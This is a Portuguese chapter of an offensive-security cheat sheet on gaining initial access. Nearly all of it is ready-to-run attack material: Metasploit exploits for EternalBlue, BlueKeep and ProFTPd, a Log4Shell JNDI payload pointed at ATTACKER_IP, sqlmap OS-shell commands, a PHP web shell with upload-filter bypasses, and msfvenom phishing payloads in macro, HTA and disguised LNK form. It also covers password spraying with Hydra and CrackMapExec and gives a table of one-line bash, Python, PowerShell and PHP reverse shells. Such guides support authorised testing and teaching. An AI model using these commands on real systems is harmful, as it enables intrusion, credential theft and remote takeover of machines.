# 🚪 Fase 1: Acesso inicial

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](01-Initial-Access.tr.md) • [🇬🇷 Ελληνικά](01-Initial-Access.el.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Objetivo:** Obter um primeiro ponto de acesso à rede ou ao sistema alvo.

> **Nota de leitura:** exploit designa código que explora uma vulnerabilidade; payload é a carga executada; uma reverse shell inicia a ligação do alvo para o listener. Exemplos como `IEX(payload)`, `BASE64_PAYLOAD` e `JNDI-Exploit.jar` são modelos ou dependências externas, não componentes fornecidos por este guia. Os exemplos de extensão de ficheiro e de exploração dependem da versão, da configuração e dos pré-requisitos do alvo. O script NSE de ProxyShell indicado deve estar disponível localmente; o nome, por si só, não garante a sua presença.

---

## 🎯 Vetores de ataque

| Vetor | Descrição |
|--------|-------------|
| **Explorar uma aplicação exposta ao público** | Vulnerabilidades em aplicações Web, APIs e sistemas de gestão de conteúdos (CMS) |
| **Phishing** | Mensagens de correio eletrónico maliciosas com payloads (cargas de ataque) |
| **Credenciais válidas** | Password spraying (testar uma palavra-passe em várias contas), credential stuffing (reutilizar pares de credenciais divulgados) |
| **Serviços externos** | RDP, SSH, VPN e FTP expostos |
| **Cadeia de fornecimento** | Comprometer software de confiança |

---

## 💻 Exploração de vulnerabilidades conhecidas

### Procurar exploits
```bash
# SearchSploit — base de dados local de exploits
searchsploit apache 2.4
searchsploit -m 41234  # Copiar o exploit para a pasta atual
searchsploit --nmap scan.xml  # Interpretar os resultados do Nmap

# Pesquisa no Metasploit
msfconsole -q -x "search type:exploit apache"
```

### Exploits comuns

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Verificar se é vulnerável
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Explorar com Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Testar a vulnerabilidade
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Preparar o servidor de exploração
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Procurar ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Utilizar o exploit
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Ataques a aplicações Web

### SQL Injection (obter uma shell)
```bash
# Testar SQLi
sqlmap -u "http://target.com/page?id=1" --batch

# Obter uma shell do sistema operativo através de SQLi
sqlmap -u "http://target.com/page?id=1" --os-shell

# Obter uma shell SQL
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Do carregamento de ficheiros à obtenção de uma shell
```bash
# Criar uma reverse shell PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Ou uma shell PHP simples
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Contornar filtros de extensões
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Execução remota de código (RCE)
```bash
# Testar RCE
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Reverse shell através de RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Ataques a credenciais

### Password spraying (uma palavra-passe em várias contas)
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential stuffing (reutilização de credenciais divulgadas)
```bash
# Utilizar credenciais divulgadas conhecidas
hydra -C creds.txt ftp://192.168.1.10

# Formato de creds.txt:
# username:password
```

### Credenciais predefinidas
```bash
# Credenciais predefinidas comuns a testar:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec com credenciais comuns
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Payloads de phishing

### Payload numa macro do Office
```bash
# Gerar um payload de macro
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Ou utilizar msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### Payload HTA
```bash
# Gerar o ficheiro HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Disponibilizar por HTTP
python3 -m http.server 80
```

### Payload LNK
```powershell
# Criar um atalho malicioso
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ Exploração de serviços externos

### Exploração de RDP
```bash
# Força bruta em RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### Exploração de SSH
```bash
# Força bruta em SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH com credenciais conhecidas
ssh user@192.168.1.10

# SSH com chave privada
ssh -i id_rsa user@192.168.1.10
```

### Exploração de FTP
```bash
# Início de sessão anónimo
ftp 192.168.1.10
# Nome de utilizador: anonymous
# Palavra-passe: anonymous

# Força bruta
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# Exploit para ProFTPd
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Configuração de listeners (processos à escuta)

### Listener Netcat
```bash
nc -lvnp 4444
```

### Handler do Metasploit
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# No sistema atacante
powercat -l -p 4444

# No sistema alvo
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Referência rápida

### Reverse shells numa única linha

| Sistema operativo | Comando |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 Guias de referência relacionados

- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)
- [Hydra](../../Hydra/README.md)
- [Vulnerabilidades Web](../../SSRF/README.md)

---

**Fase seguinte:** [02 - Enumeração/descoberta →](./02-Enumeration.pt.md)
